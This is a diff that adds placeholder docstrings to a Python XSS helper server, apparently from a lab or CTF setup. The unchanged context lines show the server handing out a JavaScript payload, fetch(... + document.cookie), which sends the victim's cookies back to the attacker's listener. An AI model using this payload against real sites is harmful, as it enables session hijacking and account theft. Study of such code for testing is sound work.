@@ -12,6 +12,12 @@ PORT = 8000
 class XSSHandler(SimpleHTTPRequestHandler):
     url = 'http://localhost:%d' % PORT
     def do_GET(self):
+        """
+        Do a get request.
+
+        Args:
+            self: (todo): write your description
+        """
         print(self.headers)
         urlparts = urlparse(self.path)
         print(urlparts)
@@ -23,6 +29,11 @@ class XSSHandler(SimpleHTTPRequestHandler):
         self.wfile.write(f"fetch('{self.url}/x?' + document.cookie)".encode())
 
 def start_server():
+    """
+    Starts a server.
+
+    Args:
+    """
     os.chdir('static')
     httpd = HTTPServer(("", PORT), XSSHandler)
     httpd.allow_reuse_address = True
